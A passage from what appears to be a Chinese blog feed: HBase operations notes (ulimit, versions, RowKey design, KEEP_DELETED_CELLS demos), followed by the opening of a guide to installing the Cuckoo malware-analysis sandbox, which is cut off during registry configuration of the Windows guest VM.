<p>HBase 打开的文件句柄数量，和 <code>StoreFile</code> 文件的数量直接相关，而 <code>StoreFile</code> 的数量受 <code>ColumnFamily</code> 的总数和 <code>Region</code> 的数量影响。每个 <code>ColumnFamily</code> 至少要用到一个 <code>StoreFile</code>，而一个被加载的 <code>Region</code> 可能要用到 <code>6</code> 个甚至更多 <code>StoreFile</code> 文件。一个 <code>RegionServer</code> 上会打开的文件句柄数量，有个大概的计算公式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(StoreFiles per ColumnFamily) x (regions per RegionServer)</div></pre></td></tr></table></figure></p>
<p><code>ulimit -u</code> 可以查看系统允许打开的进程数量，如果 HBase 启动进程过多，会抛出 <code>OutOfMemoryError</code> 异常。</p>
<hr>
<h3 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h3><p>升级过程不能跨大版本，必须从高到低依次升级。</p>
<hr>
<h3 id="索引数据"><a href="#索引数据" class="headerlink" title="索引数据"></a>索引数据</h3><p>HBase 的 <code>get</code> 功能，其实基于 <code>scan</code> 来实现，<code>scan</code> 也可以支持一些查询条件，比如下面的 Java 代码会索引出所有 <code>rowkey</code> 以 <code>0xjiayu</code> 开头的行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] CF = <span class="string">"cf"</span>.getBytes();</div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] ATTR = <span class="string">"attr"</span>.getBytes();</div><div class="line">...</div><div class="line"></div><div class="line">Table table = ...      <span class="comment">// instantiate a Table instance</span></div><div class="line"></div><div class="line">Scan scan = <span class="keyword">new</span> Scan();</div><div class="line">scan.addColumn(CF, ATTR);</div><div class="line">scan.setRowPrefixFilter(Bytes.toBytes(<span class="string">"0xjiayu"</span>));</div><div class="line">ResultScanner rs = table.getScanner(scan);</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">  <span class="keyword">for</span> (Result r = rs.next(); r != <span class="keyword">null</span>; r = rs.next()) &#123;</div><div class="line">    <span class="comment">// process result...</span></div><div class="line">  &#125;</div><div class="line">&#125; <span class="keyword">finally</span> &#123;</div><div class="line">  rs.close();  <span class="comment">// always close the ResultScanner!</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h3 id="数据记录的-version"><a href="#数据记录的-version" class="headerlink" title="数据记录的 version"></a>数据记录的 <code>version</code></h3><blockquote>
<p><strong>参考：</strong><br><a href="http://hbase.apache.org/book.html#versions" target="_blank" rel="external">http://hbase.apache.org/book.html#versions</a></p>
</blockquote>
<p>HBase 中，一个 <code>{row, column, version}</code> 的组合精准定义一条记录（<code>cell</code>），<code>row</code> 和 <code>column</code> 字段的值都是未解析的字节串，但 <code>version</code> 是长整型数字，一般是时间戳，由 <code>java.util.Date.getTime()</code> 或 <code>System.currentTimeMillis()</code> 生成。</p>
<p><code>version</code> 字段存在的意义，是相同的 <code>{row, column}</code>，插入、修改的时间戳不同，其 <code>{row, column, version}</code>  组合也代表不同的数据记录，这些数据记录实际的数据相同，但版本不相同；把 <code>version</code> 字段用到 HBase 的数据表中，意思是让 HBase 为同一组 <code>{row, column}</code> 保留的版本数目。在 HBase 0.96 以前，一个新创建的数据表默认的 <code>version</code> 值是 <code>3</code>（即默认为同一组数据最多保存 3 个版本），自 HBase 0.96 开始，默认值改为 <code>1</code>。</p>
<p><code>version</code> 字段可以在创建数据表的时候就设定好，也可以创建数据表之后用 <code>alter</code> 的方式更改，具体需查阅官方手册。</p>
<p>HBase 中，<code>version</code> 按照降序存储，所以每次需要索引数据，最新版本的数据（时间戳表示的<code>version</code> 值最大）最先被索引。默认只索引最新版本的一条记录，如果需要索引所有版本或部分版本的数据记录，可以参考 <a href="http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/client/Get.html#setMaxVersions(" target="_blank" rel="external">http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/client/Get.html#setMaxVersions(</a>) 。</p>
<p>同一条记录（<code>cell</code>）里的 <code>version</code> 容易疑惑的两个地方：</p>
<ul>
<li>如果 <code>cell</code> 被多次连续写、修改，那么只有最后一次的操作是可以索引的、有效的；</li>
<li><code>version</code> 的值只需 <strong>非升序</strong> 即可。</li>
</ul>
<p>对数据记录的每一次 <code>put</code> 操作，都会产生一个新的 <code>version</code>，但 <code>put</code> 操作的时候，可以手动指定 <code>version</code> 的时间戳的数值（一般可以指定一个比较小的数值），即可以手动指定版本，使最新的操作不是最新的 <code>version</code>。</p>
<p>HBase 中的删除，默认都是 <strong>软删除</strong>，即只做一个删除标记，然后不能索引，只有在随后的 <code>Major Compaction</code> 中，才会真正地删除。另外，删除操作中，除非指定删除一个版本，不然会把小于等于当前版本的所有记录都标记为删除。</p>
<hr>
<h3 id="HBase-数据表相关"><a href="#HBase-数据表相关" class="headerlink" title="HBase 数据表相关"></a>HBase 数据表相关</h3><p>不支持原生的 Join 操作。</p>
<p>表设计的一些经验准则：</p>
<ul>
<li>一个 <code>region</code> 大小在 10~50GB 之间比较合适；</li>
<li>HBase 中的单条记录（<code>cell</code>），不宜超过 10MB，如果启用 <code>mob</code> 模块，不宜超过 50MB，不然可以考虑把数据放到 HDFS 中，然后在 HBase 中只存一个指针或者表明数据再 HDFS 位置的字串；</li>
<li>单个数据表的 <code>ColumnFamily</code> 数量不宜超过 3 个，设计 HBase 的数据表，尽量不要模仿关系数据库表的设计；</li>
<li>包含 1 到 2 个 <code>ColumnFamily</code> 的数据表，对应的 <code>Regoin</code> 数量在 50~100 个比较适合；</li>
<li><code>ColumnFamily</code> 的值越短越好，因为实际存储中，它会做每一个值的前缀，越短越节省存储空间；</li>
<li>如果只有一个 <code>ColumnFamily</code> 有频繁的写操作，那么它占用内存最多。分配资源的时候注意这一个写操作模型。</li>
</ul>
<hr>
<h3 id="RowKey-相关"><a href="#RowKey-相关" class="headerlink" title="RowKey 相关"></a>RowKey 相关</h3><blockquote>
<p><strong>参考：</strong><br><a href="http://hbase.apache.org/book.html#rowkey.design" target="_blank" rel="external">http://hbase.apache.org/book.html#rowkey.design</a></p>
</blockquote>
<p>HBase 中存储数据，RowKey 是按字典序存储的，如果相似（名称、意义或功能相似）的 RowKey 设计的值有相同的字符前缀，那么它们会被会相邻存储在 HBase 中，此时RowKey 设计不当会导致 <strong>访问热区</strong> 问题。避免这个问题通常有三种策略：</p>
<ol>
<li>RowKey 加盐（ Salting ）—— 利于写入，不利于批量检索</li>
<li>单路哈希 —— 利于批量检索</li>
<li>翻转 RowKey</li>
</ol>
<p>RowKey、ColumnFamily 和 Column Qualifier 的值都要设的尽量简洁，以减少 HBase 的存储消耗（它们会在同一组数据中反复出现，比较占用存储空间）</p>
<p>HBase 底层是 <strong>列式存储</strong>，所以在操作数据的时候，列优先、行次之，所以先看 ColumnFamily 再看 RowKey —— 相同的 RowKey 可以对应不同的 ColumnFamily，不同的 ColumnFamily 可以包含同一个 RowKey。</p>
<p>对于同一个 ColumnFamily 来说，某一特定的 RowKey 是不可变的。改变 RowKey 的唯一方式是先删除再重新插入。</p>
<hr>
<h3 id="索引软删除的数据"><a href="#索引软删除的数据" class="headerlink" title="索引软删除的数据"></a>索引软删除的数据</h3><blockquote>
<p><strong>参考：</strong><br><a href="http://hbase.apache.org/book.html#cf.keep.deleted" target="_blank" rel="external">http://hbase.apache.org/book.html#cf.keep.deleted</a></p>
</blockquote>
<p>上面说过，HBase 中的数据都是 <strong>软删除</strong>，<code>delete</code> 操作只是给特定的数据做一个删除标记，在后续的 <code>Major Compaction</code> 中才会被 <strong>硬删除</strong>。处于 <strong>软删除</strong> 状态的数据，在常规的索引方式下不会被索引到。但 HBase 提供了另外一种机制，可以通过 <strong><code>Raw Scan</code></strong> 的方式索引到 <strong>软删除</strong> 状态中的数据，并且 <code>Major Compaction</code> 也不会把相应的数据进行 <strong>硬删除</strong>（即经过<code>Major Compaction</code> 任务之后，<strong>软删除</strong> 状态的数据依然可以被索引到）。</p>
<p>可以对 <strong>ColumnFamily</strong> 指定是否要启用这种数据保存机制，启用方式有两种，一种是 HBase 的 Shell 命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hbase&gt; alter ‘t1′, NAME =&gt; ‘f1′, KEEP_DELETED_CELLS =&gt; <span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>HBase Java API 中的启用方式为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">HColumnDescriptor.setKeepDeletedCells(<span class="keyword">true</span>);</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>通过实例演示 <code>KEEP_DELETED_CELLS</code>机制的效果，先看没启用这种机制时的操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">create <span class="string">'test'</span>, &#123;NAME=&gt;<span class="string">'e'</span>, VERSIONS=&gt;2147483647&#125;</div><div class="line">put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 10</div><div class="line">put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 12</div><div class="line">put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 14</div><div class="line">delete <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>,  11</div><div class="line"></div><div class="line">hbase(main):017:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0120 seconds</div><div class="line"></div><div class="line">hbase(main):018:0&gt; flush <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.0350 seconds</div><div class="line"></div><div class="line">hbase(main):019:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0120 seconds</div><div class="line"></div><div class="line">hbase(main):020:0&gt; major_compact <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.0260 seconds</div><div class="line"></div><div class="line">hbase(main):021:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0120 seconds</div></pre></td></tr></table></figure></p>
<p>启用 <code>KEEP_DELETED_CELLS</code> 机制后的演示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">hbase(main):005:0&gt; create <span class="string">'test'</span>, &#123;NAME=&gt;<span class="string">'e'</span>, VERSIONS=&gt;2147483647, KEEP_DELETED_CELLS =&gt; <span class="literal">true</span>&#125;</div><div class="line">0 row(s) <span class="keyword">in</span> 0.2160 seconds</div><div class="line"></div><div class="line">=&gt; Hbase::Table - <span class="built_in">test</span></div><div class="line">hbase(main):006:0&gt; put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 10</div><div class="line">0 row(s) <span class="keyword">in</span> 0.1070 seconds</div><div class="line"></div><div class="line">hbase(main):007:0&gt; put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 12</div><div class="line">0 row(s) <span class="keyword">in</span> 0.0140 seconds</div><div class="line"></div><div class="line">hbase(main):008:0&gt; put <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>, <span class="string">'value'</span>, 14</div><div class="line">0 row(s) <span class="keyword">in</span> 0.0160 seconds</div><div class="line"></div><div class="line">hbase(main):009:0&gt; delete <span class="string">'test'</span>, <span class="string">'r1'</span>, <span class="string">'e:c1'</span>,  11</div><div class="line">0 row(s) <span class="keyword">in</span> 0.0290 seconds</div><div class="line"></div><div class="line">hbase(main):010:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0550 seconds</div><div class="line"></div><div class="line">hbase(main):011:0&gt; flush <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.2780 seconds</div><div class="line"></div><div class="line">hbase(main):012:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     OLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0620 seconds</div><div class="line"></div><div class="line">hbase(main):013:0&gt; major_compact <span class="string">'test'</span></div><div class="line">0 row(s) <span class="keyword">in</span> 0.0530 seconds</div><div class="line"></div><div class="line">hbase(main):014:0&gt; scan <span class="string">'test'</span>, &#123;RAW=&gt;<span class="literal">true</span>, VERSIONS=&gt;1000&#125;</div><div class="line">ROW     COLUMN+CELL</div><div class="line">r1      column=e:c1, timestamp=14, value=value</div><div class="line">r1      column=e:c1, timestamp=12, value=value</div><div class="line">r1      column=e:c1, timestamp=11, <span class="built_in">type</span>=DeleteColumn</div><div class="line">r1      column=e:c1, timestamp=10, value=value</div><div class="line">1 row(s) <span class="keyword">in</span> 0.0650 seconds</div></pre></td></tr></table></figure></p>
<p>可以发现，启用 <code>KEEP_DELETED_CELLS</code> 机制后，即使数据被 <code>delete</code> 而且手动执行 <code>major Compaction</code>，数据仍然能够被索引到。</p>
<p>那么问题就来了，启用 <code>KEEP_DELETED_CELLS</code> 机制后，被标记删除的数据，到底什么时候会被 <strong>硬删除</strong> ？按照官方说明，只有发生以下情况（之一）数据才会被 <strong>硬删除</strong>：</p>
<ol>
<li>数据生存期（TTL）到达，该 Row 的每个 Version 都会被彻底删除；</li>
<li>该 Row 的 Version 数量超过 <strong>版本数量上限</strong> （maximum number of versions）</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;同时打开的文件和进程数量限制-ulimit&quot;&gt;&lt;a href=&quot;#同时打开的文件和进程数量限制-ulimit&quot; class=&quot;headerlink&quot; title=&quot;同时打开的文件和进程数量限制 (ulimit)&quot;&gt;&lt;/a&gt;同时打开的文件和进程数量限制 (ulimit)&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考&lt;/strong&gt;:&lt;br&gt;&lt;a href=&quot;http://hbase.apache.org/book.html#basic.prerequisites&quot;&gt;http://hbase.apache.org/book.html#basic.prerequisites&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Linux 系统默认的 &lt;code&gt;ulimit -n&lt;/code&gt; 结果为 &lt;code&gt;1024&lt;/code&gt; ，这个数量对 HBase 来说有点低，如果 HBase 打开的文件句柄数量超过这个限制，会报以下形式的错误：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Exception increateBlockOutputStream java.io.EOFException&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Abandoning block blk_-6935524980745310745_1391901&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;官方建议这个数值最少 &lt;code&gt;10000&lt;/code&gt;，不过最好是 2 幂或可以跟 2 的幂有简单的换算关系，比如 &lt;code&gt;10240&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="bigdata" scheme="http://jiayu0x.com/categories/bigdata/"/>
    
    
      <category term="bigdata" scheme="http://jiayu0x.com/tags/bigdata/"/>
    
      <category term="hbase" scheme="http://jiayu0x.com/tags/hbase/"/>
    
  </entry>
  
  <entry>
    <title>Cuckoo 安装、配置详解</title>
    <link href="http://jiayu0x.com/2016/07/07/Cuckoo-install-config/"/>
    <id>http://jiayu0x.com/2016/07/07/Cuckoo-install-config/</id>
    <published>2016-07-06T16:00:00.000Z</published>
    <updated>2017-04-04T11:57:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h2><p><strong>沙盒</strong>(<strong>Sanbox</strong>) 是一种将未知、不可信的软件隔离执行的安全机制。恶意软件分析沙盒一般用来将不可信软件放在隔离环境中自动地动态执行，然后提取其运行过程中的进程行为、网络行为、文件行为等动态行为，安全研究员可以根据这些行为分析结果对恶意软件进行更深入地分析。</p>
<p>Cuckoo 是一款用 <strong>Python</strong> 编写的开源的自动化恶意软件分析系统，它的主要功能有：</p>
<ul>
<li>跟踪记录恶意软件所有的调用状况；</li>
<li>恶意软件文件行为：恶意软件执行过程中创建新文件、修改文件、删除文件、读取文件或下载文件的行为；</li>
<li>获取恶意软件的内存镜像；</li>
<li>以 PCAP 格式记录恶意软件的网络流量；</li>
<li>获取恶意软件执行过程中的屏幕截图；</li>
<li>获取执行恶意软件的客户机的完整内存镜像</li>
</ul>
<a id="more"></a>
<p>Cuckoo 可以分析的文件类型包括但不限于：</p>
<ul>
<li>Windows 可执行文件</li>
<li>DLL 文件</li>
<li>PDF 文件</li>
<li>MS Office 文件</li>
<li>URL 和 HTML 文件</li>
<li>PHP 脚本文件</li>
<li>CPL 文件</li>
<li>VB 脚本文件</li>
<li>ZIP 压缩包</li>
<li>JAR 文件</li>
<li>Python 脚本文件</li>
<li>APK 文件</li>
<li>ELF 文件</li>
</ul>
<p>Cuckoo 的架构也比较简单，在 Host 机上运行 Cuckoo 主程序，多个 Guest 机通过虚拟网络与 Host 机相连，每个 Guest 机上有一个 <strong>Cuckoo Agent</strong> 程序，用来做 Cuckoo 的监控代理，结构图如下：<br><img src="/imgs/1467691019551.png" alt="Cuckoo 架构图"></p>
<hr>
<h2 id="0x01-Host-机环境准备"><a href="#0x01-Host-机环境准备" class="headerlink" title="0x01 Host 机环境准备"></a>0x01 Host 机环境准备</h2><p>Host 机操作系统： <strong>Ubuntu14.04.01_amd64_desktop</strong>（官方推荐用 Ubuntu 最新的 LTS 版本），Python 版本 <strong>2.7.6</strong>。</p>
<p>先去 Cuckoo Sandbox 官网下载最新的发布版本（目前是 <strong><em>v2.0-RC1</em></strong>）： <a href="https://cuckoosandbox.org/" target="_blank" rel="external">https://cuckoosandbox.org/</a></p>
<p>先安装基本的依赖：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python python-pip python-dev libffi-dev libssl-dev</div></pre></td></tr></table></figure></p>
<p>如果要用 Cuckoo 自带的基于 Django 的 Web 管理系统，还要安装 MongoDB：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install mongodb</div></pre></td></tr></table></figure></p>
<p>接下来需要批量安装 Cuckoo 的 Python 依赖包，Cuckoo 主目录里有一个 <code>requirements.txt</code> 文件，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">alembic==0.8.0</div><div class="line">beautifulsoup4==4.4.1</div><div class="line">cffi==1.2.1</div><div class="line">chardet==2.3.0</div><div class="line">cryptography==1.0</div><div class="line">Django==1.8.4</div><div class="line">dpkt==1.8.6.2</div><div class="line">ecdsa==0.13</div><div class="line">enum34==1.0.4</div><div class="line">Flask==0.10.1</div><div class="line">HTTPReplay==0.1.5</div><div class="line">idna==2.0</div><div class="line">ipaddress==1.0.14</div><div class="line">itsdangerous==0.24</div><div class="line">Jinja2==2.8</div><div class="line">jsbeautifier==1.5.10</div><div class="line">Mako==1.0.1</div><div class="line">MarkupSafe==0.23</div><div class="line">ndg-httpsclient==0.4.0</div><div class="line">http://pefile.googlecode.com/files/pefile-1.2.10-139.tar.gz#egg=pefile</div><div class="line">pyasn1==0.1.8</div><div class="line">pycparser==2.14</div><div class="line">pymongo==3.0.3</div><div class="line">pyOpenSSL==0.15.1</div><div class="line">python-dateutil==2.4.2</div><div class="line">python-editor==0.3</div><div class="line">python-magic==0.4.6</div><div class="line">requests==2.7.0</div><div class="line">six==1.9.0</div><div class="line">SQLAlchemy==1.0.8</div><div class="line">tlslite-ng==0.6.0-alpha3</div><div class="line">wakeonlan==0.2.2</div><div class="line">Werkzeug==0.10.4</div></pre></td></tr></table></figure></p>
<p>其中的 <code>pefile</code> 需要从 Google Code 上下载，由于大陆网络限制，需要自备梯子，登上梯子后执行以下批量安装命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install -r requirements.txt</div></pre></td></tr></table></figure></p>
<blockquote>
<p>或者先在爬梯子的情况下手动安装 <code>pefile</code>，再把 <code>pefile</code> 这一项从 <code>requirements.txt</code>文件中剔除，然后在不翻墙的状态下批量安装其他不用翻墙的依赖包</p>
</blockquote>
<p>Host 机需要可以嗅探网络数据包，需要安装 <code>tcpdump</code> ，如果本机没有，则执行以下命令安装 <code>tcpdump</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install tcpdump</div></pre></td></tr></table></figure></p>
<p>如果系统没启用 <code>root</code> 账户，由于 <code>tcpdump</code> 的执行需要 <code>root</code> 权限，则需要以下配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo <span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump</div></pre></td></tr></table></figure></p>
<p>如果系统里没有<code>setcap</code>命令，则需要安装 <code>libpcap</code>包：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install libcap2-bin</div></pre></td></tr></table></figure></p>
<p>如果需要启用内存镜像分析，需要安装 <code>volatility</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install volatility</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="0x02-Guest-客户机配置"><a href="#0x02-Guest-客户机配置" class="headerlink" title="0x02 Guest 客户机配置"></a>0x02 Guest 客户机配置</h2><p>根据前文的 Cuckoo 架构图，前面准备好了宿主机，下面就该准备 Guest 机器了。Guest 机是一个或多个虚拟机，官方推荐的虚拟机管理软件是 <strong><code>VirtualBox</code></strong> 。</p>
<p>先去 VBox 官网下载最新的对应系统版本的 Deb 安装包： <a href="https://www.virtualbox.org/wiki/Linux_Downloads" target="_blank" rel="external">https://www.virtualbox.org/wiki/Linux_Downloads</a></p>
<p>安装好 VBox 之后，创建新的虚拟机（推荐用 <code>Windows7</code>），需要对 Win7 客户机做一些基础配置。</p>
<h3 id="0x02-1-安装-Cuckoo-Agent"><a href="#0x02-1-安装-Cuckoo-Agent" class="headerlink" title="0x02.1 安装 Cuckoo Agent"></a>0x02.1 安装 Cuckoo Agent</h3><p>Cuckoo Agent 是一个植入客户机的 Python 脚本，通过 XMLRPC Server 的方式来跟 Host 主机通信、交换数据。这个 Python 脚本是跨平台的，可以在 Windows/Linux/OS X 上运行。所以客户机上需要安装 Python 环境，如果需要截屏功能，还要安装 <strong><code>PIL</code></strong> （Python Image Library）库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip instsall PIL</div></pre></td></tr></table></figure></p>
<p>Cuckoo Agent 在 Window 系统上的安装方法很简单，只需要将 <code>cuckoo/agent/agent.py</code> 文件拷贝到 Win7 客户机里，并启动即可。</p>
<p>但是这样的运行方式并不够完美，我们需要这个 <code>agent.py</code> 开机启动，并且不能有运行窗口，这就需要另做一些处理：</p>
<ol>
<li>把 <code>agent.py</code> 文件放到系统开机启动目录中，Win7 默认的路径是 <code>C:\Users\[USER]\AppData\Roaming\MicroSoft\Windows\Start Menu\Programs\Startup\</code>；</li>
<li>把 <code>agent.py</code> 后缀改成 <code>agent.pyw</code>，这样程序启动就不会有 GUI 窗口了。</li>
</ol>
<h3 id="0x02-2-配置系统开机自动登录"><a href="#0x02-2-配置系统开机自动登录" class="headerlink" title="0x02.2 配置系统开机自动登录"></a>0x02.2 配置系统开机自动登录</h3><p>Win7 客户机如果开机自动登录，可以方便 Cuckoo 控制。可以用管理员权限打开 CMD 窗口，依次执行以下命令：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultUserName /d &lt;USERNAME&gt; /t REG_SZ /f</div><div class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultPassword /d &lt;PASSWORD&gt; /t REG_SZ /f</div><div class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v AutoAdminLogon /d <span class="number">1</span> /t REG_SZ /f</div><div class="line">reg add <span class="string">"hklm\system\CurrentControlSet\Control\TerminalServer"</span> /v AllowRemoteRPC /d <span class="number">0</span>x01 /t REG_DWORD /f</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span> /v LocalAccountTokenFilterPolicy /d <span class="number">0</span>x01 /t REG_DWORD /f</div></pre></td></tr></table></figure></p>
<blockquote>
